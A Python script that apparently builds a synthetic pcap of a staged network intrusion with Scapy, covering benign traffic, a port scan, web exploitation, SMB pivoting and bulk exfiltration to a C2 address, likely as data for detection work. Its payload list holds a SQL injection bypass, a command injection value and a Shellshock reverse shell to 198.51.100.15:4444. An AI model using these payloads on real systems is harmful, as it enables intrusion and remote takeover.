import os
import random
import numpy as np
from scapy.all import IP, TCP, UDP, Raw, wrpcap

def build_packet(src_ip, dst_ip, sport, dport, proto="TCP", flags="S", 
                 payload="", seq=1000, ack=0, ttl=64, win=8192, timestamp=0.0):
    """Constructs an IP/Transport layer packet with custom timestamps and flags."""
    if proto == "TCP":
        transport = TCP(sport=sport, dport=dport, flags=flags, seq=seq, ack=ack, window=win)
    elif proto == "UDP":
        transport = UDP(sport=sport, dport=dport)
    else:
        raise ValueError("Unsupported protocol")

    pkt = IP(src=src_ip, dst=dst_ip, ttl=ttl) / transport
    if payload:
        pkt = pkt / Raw(load=payload.encode('utf-8') if isinstance(payload, str) else payload)
    
    # Explicitly set epoch timestamp in Scapy
    pkt.time = float(timestamp)
    return pkt

def generate_multi_stage_pcap(output_path="data/raw/synthetic_multi_stage_attack.pcap"):
    """
    Generates a 300-second multi-stage network capture:
      Phase 0 (00s - 60s): Benign enterprise traffic (DNS/HTTP browsing)
      Phase 1 (60s - 120s): Reconnaissance (SYN port sweep across range)
      Phase 2 (120s - 180s): Initial Access (Web exploit brute force & SQLi payload)
      Phase 3 (180s - 240s): Lateral Movement (Pivoting via SMB/RDP to internal target)
      Phase 4 (240s - 300s): Data Exfiltration (High-volume burst to external C2)
    """
    packets = []
    
    # Topology definition
    EXTERNAL_ATTACKER = "198.51.100.15"
    C2_DROP_SERVER    = "203.0.113.88"
    DMZ_WEB_SERVER    = "192.168.1.100"
    INTERNAL_DB       = "10.0.0.50"
    BENIGN_CLIENT     = "192.168.1.25"
    BENIGN_GATEWAY    = "8.8.8.8"

    print("Generating Synthetic Multi-Stage Network Intrusion...")

    # =========================================================================
    # Phase 0: Baseline Benign Activity (t = 0.0s to 60.0s)
    # =========================================================================
    print("  [0/4] Simulating Benign Background Traffic (0s - 60s)...")
    curr_time = 1.0
    while curr_time < 58.0:
        # Periodic DNS query + response
        curr_time += random.uniform(2.0, 5.0)
        packets.append(build_packet(BENIGN_CLIENT, BENIGN_GATEWAY, sport=53211, dport=53, 
                                    proto="UDP", payload="query.google.com", timestamp=curr_time))
        packets.append(build_packet(BENIGN_GATEWAY, BENIGN_CLIENT, sport=53, dport=53211, 
                                    proto="UDP", payload="response.google.com.ip", timestamp=curr_time + 0.02))

        # Periodic regular HTTP traffic
        curr_time += random.uniform(1.0, 3.0)
        sport = random.randint(49152, 65535)
        # 3-way handshake + response
        packets.append(build_packet(BENIGN_CLIENT, DMZ_WEB_SERVER, sport=sport, dport=80, flags="S", timestamp=curr_time))
        packets.append(build_packet(DMZ_WEB_SERVER, BENIGN_CLIENT, sport=80, dport=sport, flags="SA", timestamp=curr_time + 0.01))
        packets.append(build_packet(BENIGN_CLIENT, DMZ_WEB_SERVER, sport=sport, dport=80, flags="A", timestamp=curr_time + 0.02))
        packets.append(build_packet(BENIGN_CLIENT, DMZ_WEB_SERVER, sport=sport, dport=80, flags="PA", 
                                    payload="GET /index.html HTTP/1.1", timestamp=curr_time + 0.03))

    # =========================================================================
    # Phase 1: Reconnaissance (SYN Sweep / Port Scanning) (t = 60.0s to 120.0s)
    # =========================================================================
    print("  [1/4] Simulating Stage 1: Reconnaissance (Port Scan) (60s - 120s)...")
    curr_time = 60.0
    scan_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 8080]
    random.shuffle(scan_ports)

    for dport in scan_ports:
        curr_time += random.uniform(0.5, 2.5)  # Fast inter-arrival time
        sport = random.randint(40000, 50000)
        
        # High SYN count, random TTL indicating external spoofing/scanner
        packets.append(build_packet(EXTERNAL_ATTACKER, DMZ_WEB_SERVER, sport=sport, dport=dport, 
                                    flags="S", ttl=random.choice([48, 52, 60]), timestamp=curr_time))
        
        # Target responds: RST on closed ports, SYN-ACK on open port 80 & 22
        if dport in [80, 22]:
            packets.append(build_packet(DMZ_WEB_SERVER, EXTERNAL_ATTACKER, sport=dport, dport=sport, 
                                        flags="SA", timestamp=curr_time + 0.03))
        else:
            packets.append(build_packet(DMZ_WEB_SERVER, EXTERNAL_ATTACKER, sport=dport, dport=sport, 
                                        flags="R", timestamp=curr_time + 0.02))

    # =========================================================================
    # Phase 2: Initial Access (Web Shell Injection / Brute Force) (t = 120.0s to 180.0s)
    # =========================================================================
    print("  [2/4] Simulating Stage 2: Initial Access (Web Exploit) (120s - 180s)...")
    curr_time = 120.0
    exploit_payloads = [
        "POST /login.php HTTP/1.1\\r\\nUser: admin' OR '1'='1",
        "POST /api/upload HTTP/1.1\\r\\ncmd=id;whoami",
        "POST /cgi-bin/test.cgi HTTP/1.1\\r\\n() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.15/4444 0>&1'"
    ]

    for attack_burst in range(6):
        curr_time += random.uniform(5.0, 8.0)
        sport = random.randint(51000, 52000)
        
        # TCP Handshake
        packets.append(build_packet(EXTERNAL_ATTACKER, DMZ_WEB_SERVER, sport=sport, dport=80, flags="S", timestamp=curr_time))
        packets.append(build_packet(DMZ_WEB_SERVER, EXTERNAL_ATTACKER, sport=80, dport=sport, flags="SA", timestamp=curr_time + 0.02))
        packets.append(build_packet(EXTERNAL_ATTACKER, DMZ_WEB_SERVER, sport=sport, dport=80, flags="A", timestamp=curr_time + 0.03))
        
        # Heavy payload + intentionally injected duplicate sequence for retransmission flag
        payload = exploit_payloads[attack_burst % len(exploit_payloads)]
        seq_num = 2000
        packets.append(build_packet(EXTERNAL_ATTACKER, DMZ_WEB_SERVER, sport=sport, dport=80, flags="PA", 
                                    payload=payload, seq=seq_num, timestamp=curr_time + 0.05))
        
        # Retransmission trigger
        packets.append(build_packet(EXTERNAL_ATTACKER, DMZ_WEB_SERVER, sport=sport, dport=80, flags="PA", 
                                    payload=payload, seq=seq_num, timestamp=curr_time + 0.15))

        # Response
        packets.append(build_packet(DMZ_WEB_SERVER, EXTERNAL_ATTACKER, sport=80, dport=sport, flags="A", 
                                    ack=seq_num + len(payload), timestamp=curr_time + 0.18))

    # =========================================================================
    # Phase 3: Lateral Movement (Internal SMB Pivot) (t = 180.0s to 240.0s)
    # =========================================================================
    print("  [3/4] Simulating Stage 3: Lateral Movement (SMB / RDP Pivoting) (180s - 240s)...")
    curr_time = 180.0
    sport = 49872

    # DMZ Web Server compromises and pivots to Internal Database server over port 445 (SMB)
    packets.append(build_packet(DMZ_WEB_SERVER, INTERNAL_DB, sport=sport, dport=445, flags="S", timestamp=curr_time))
    packets.append(build_packet(INTERNAL_DB, DMZ_WEB_SERVER, sport=445, dport=sport, flags="SA", timestamp=curr_time + 0.005))
    packets.append(build_packet(DMZ_WEB_SERVER, INTERNAL_DB, sport=sport, dport=445, flags="A", timestamp=curr_time + 0.01))

    for chunk in range(12):
        curr_time += random.uniform(2.0, 4.0)
        # SMB Tree Connect / IPC$ / Admin Share query simulation
        smb_payload = f"SMB2_COMMAND_TREE_CONNECT_ANDX_SHARE\\\\10.0.0.50\\C$\\dump_sqldb_part_{chunk}.bak"
        packets.append(build_packet(DMZ_WEB_SERVER, INTERNAL_DB, sport=sport, dport=445, flags="PA", 
                                    payload=smb_payload, seq=5000 + (chunk * 100), timestamp=curr_time))
        packets.append(build_packet(INTERNAL_DB, DMZ_WEB_SERVER, sport=445, dport=sport, flags="A", 
                                    timestamp=curr_time + 0.02))

    # =========================================================================
    # Phase 4: Data Exfiltration / C2 Outbound Surge (t = 240.0s to 300.0s)
    # =========================================================================
    print("  [4/4] Simulating Stage 4: Exfiltration & C2 Traffic (240s - 300s)...")
    curr_time = 240.0
    c2_sport = 44444
    
    # Handshake with C2 Server
    packets.append(build_packet(DMZ_WEB_SERVER, C2_DROP_SERVER, sport=c2_sport, dport=443, flags="S", timestamp=curr_time))
    packets.append(build_packet(C2_DROP_SERVER, DMZ_WEB_SERVER, sport=443, dport=c2_sport, flags="SA", timestamp=curr_time + 0.05))
    packets.append(build_packet(DMZ_WEB_SERVER, C2_DROP_SERVER, sport=c2_sport, dport=443, flags="A", timestamp=curr_time + 0.06))

    # Large MTU chunks streaming out data (High byte rate / high fwd_bytes)
    data_block = "X" * 1420  # Near MTU maximum payload
    for i in range(25):
        curr_time += 0.4
        packets.append(build_packet(DMZ_WEB_SERVER, C2_DROP_SERVER, sport=c2_sport, dport=443, flags="PA", 
                                    payload=data_block, seq=10000 + (i * 1420), timestamp=curr_time))
        if i % 3 == 0:
            packets.append(build_packet(C2_DROP_SERVER, DMZ_WEB_SERVER, sport=443, dport=c2_sport, flags="A", 
                                        timestamp=curr_time + 0.02))

    # Graceful connection teardown (FIN-ACK)
    curr_time += 1.0
    packets.append(build_packet(DMZ_WEB_SERVER, C2_DROP_SERVER, sport=c2_sport, dport=443, flags="FA", timestamp=curr_time))
    packets.append(build_packet(C2_DROP_SERVER, DMZ_WEB_SERVER, sport=443, dport=c2_sport, flags="A", timestamp=curr_time + 0.02))

    # Write output to file
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    wrpcap(output_path, packets)
    print(f"\n[+] Successfully generated {len(packets)} packets in: {output_path}")

if __name__ == "__main__":
    generate_multi_stage_pcap()